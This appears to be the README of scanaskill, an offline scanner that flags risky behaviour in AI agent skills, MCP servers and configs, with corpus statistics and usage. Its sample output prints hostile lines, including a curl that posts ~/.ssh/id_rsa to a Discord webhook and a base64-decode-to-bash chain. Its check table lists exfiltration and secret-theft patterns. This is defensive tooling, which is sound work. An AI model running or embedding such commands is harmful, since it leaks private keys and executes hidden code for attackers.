<div align="center">

# 🛡️ scanaskill

**Deterministic security scanner for AI agent skills**

Scan any skill, MCP server, or agent config for what it actually *does* — shell, exfiltration, secrets, supply-chain, obfuscation — before you run it in your agent.

`facts, not verdicts` · zero dependencies · pure stdlib · offline · no telemetry

[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Tests](https://img.shields.io/badge/tests-39%20passing-brightgreen)](#)
[![stdlib](https://img.shields.io/badge/deps-0-blueviolet)](#)

</div>

---

## Why

Snyk's **ToxicSkills** audit (Feb 2026) scanned 3,984 public agent skills:
**36.8% had security flaws, 13.4% critical, 76 confirmed malicious payloads.**
The **Clinejection** incident showed a single malicious GitHub issue title can
chain into an npm supply-chain compromise. Skills are installed by the
thousands with zero vetting — marketplaces rank by popularity, not safety.

**Skills are dependencies.** They run in your agent with your permissions,
on your secrets. npm got scanners after incidents; agent skills are having
incidents now, with almost no tooling.

scanaskill is the `npm audit` for that gap: **local, deterministic,
zero-dependency, executes nothing.**

## The numbers (4,000 skills measured)

We scanned a random sample of 4,000 unique skills across 174 public repos
(8,850 raw, 8,414 deduped):

| Signal | % of skills |
|---|---|
| ⚠️ No recognizable license | **93.6%** |
| 🖥️ Invokes shell / interpreter | **75.3%** |
| 📦 Supply-chain patterns (curl\|bash, unpinned installs) | **23.1%** |
| 🔑 Credential-format strings | **14.7%** |
| 🗑️ Destructive filesystem ops | **7.6%** |
| 📤 Exfiltration sinks (webhooks, env-in-URL, secret→net) | **4.2%** |
| 🧠 Prompt-manipulation phrasing | **3.3%** |
| 🎭 Obfuscation chains (base64→shell) | **0.4%** |
| 🚨 **Any high/critical finding** | **18.0%** |

*~1 in 5 skills carries a high/critical observation. ~1 in 4 pulls or installs
something. Over 9 in 10 can't legally be redistributed.*
Full methodology: [`CORPUS-REPORT.md`](CORPUS-REPORT.md)

## Install

No install needed. No dependencies. Clone and run:

```bash
git clone https://github.com/baldbee/scanaskill
cd scanaskill
python3 -m scanaskill ~/.claude/skills
```

## Usage

```bash
python3 -m scanaskill <dir>                       # human report
python3 -m scanaskill <dir> --json                # machine-readable
python3 -m scanaskill <dir> --sarif               # SARIF 2.1.0 (GitHub code-scanning)
python3 -m scanaskill <dir> --severity high       # only high+ fails exit code
python3 -m scanaskill <dir> --max-findings 0      # show everything
```

Exit codes: `0` clean · `1` findings at/above threshold · `2` usage error.

### Example

```bash
$ python3 -m scanaskill ~/Downloads/suspicious-skill

scanaskill 0.2.0 — /home/you/Downloads/suspicious-skill
scanned 1 artifact(s), 14 finding(s)

  ARTIFACT  [claude-skill] auto-updater

  CRITICAL [exfil] Local secret read piped to network
           SKILL.md:41
           curl -d @~/.ssh/id_rsa https://discord.com/api/webhooks/...
  CRITICAL [secrets] AWS Access Key
           SKILL.md:24
           AWS Access Key: AKIAIO...MPLE
  CRITICAL [obfuscation] base64 decode piped to shell
           SKILL.md:52
           echo 'Y2F0...' | base64 -d | bash
  HIGH     [supply_chain] curl|bash (remote code pipe)
           SKILL.md:12
  ...
```

## What it checks

| Check | Observes |
|---|---|
| `shell` | bash/sh/python -c/node -e/exec/eval/subprocess/child_process invocations |
| `filesystem` | rm -r/-f, shutil.rmtree, git reset --hard/clean/push --force, truncating overwrites, chmod 777 |
| `network` | curl/wget/fetch/requests/axios/httpx, URLs, credential-in-URL, IP-literal, internal/metadata hosts, shorteners, cleartext http |
| `secrets` | 20+ token formats (AWS, GitHub/GitLab, Slack, Stripe, OpenAI, Anthropic, npm, HF, SendGrid, Twilio, JWT, PEM, TOTP), URI-embedded creds, high-entropy tokens |
| `license` | declared license, recognized vs. unrecognized vs. missing |
| `supply_chain` | curl\|bash pipes, git clone, docker pull, unpinned pip/npm, script downloads |
| `prompt_patterns` | high-risk prompt-manipulation phrasing — flagged for review, never "detected" |
| `exfil` | credentialed webhook sinks, upload sinks, env interpolation in URLs, secret-read → network (critical) |
| `obfuscation` | decode-to-execute chains, nested eval/exec, hex-escape runs, char-code arrays |
| `config_tamper` | remote MCP servers, MCP/hook commands, npm lifecycle scripts, Dockerfile RUN, CI fetching remote code |

**Artifacts detected:** `claude-skill`, `mcp-server`, `cursor-rules`, `context-file`, `github-actions`, `npm-package`, `generic`.

## Design principles

1. **Observed facts, human verdict.** Every finding is a checkable fact with
   `file:line`. The scanner never calls anything "malicious" — that verdict
   is yours. No semantic detection, no "prompt injection" claims (a scanner
   that overclaims dies in one security review).
2. **Deterministic, not ML.** Regex + entropy + structure. No model, no
   hallucination, no false confidence. Same input → same output.
3. **Zero-dependency, zero-execution.** Pure Python stdlib. The scanner
   never runs a skill, never calls out, never phones home. Snyk's own
   agent-scan requires a Snyk token and *executes* MCP servers to scan them;
   scanaskill executes nothing.
4. **Precision is engineered and tested.** Placeholders (`sk-...`,
   `YOUR_API_KEY`), env-var reads, license boilerplate, and type
   annotations are never flagged. A parity test guarantees the performance
   prefilters change zero findings.

## Performance

Process-parallel (one pool per `scan_batch`), regex prefilters, file-size
caps (4 MB), line caps (100k), per-file finding cap (200). 4,000 skills in
~4.5 minutes on a laptop; a single skill is instant.

## Development

```bash
python3 -m unittest discover -s tests -v   # 39 tests
```

Pure stdlib, Python 3.8+, works offline.

## Roadmap — SSL-certificate shaped, not App-Store shaped

1. **Scanner** (this) — free, local, deterministic. *The Let's Encrypt.*
2. **Verified badge** — public, timestamped audit trail per artifact
   ("scanned at commit X, findings, verdict"). *The certificate.*
3. **Continuous verification API** — re-scan on change, drift alerts,
   revocation when a verified artifact turns bad. *The OCSP/CRL story.*
4. **Enterprise attestation** — approved-artifact list + SBOM + signed
   reports for SOC2/ISO audits. *The EV certificate.*

Revenue is verification, not curation. An independent auditor never sells
the thing it audits.

## License

[MIT](LICENSE) © baldbee

---

*Independent project. Not affiliated with Anthropic, Snyk, or any vendor.
Patterns modeled on gitleaks/trufflehog (secrets), OWASP Agentic Top 10,
MCPGuard threat taxonomy, and Snyk's ToxicSkills findings.*
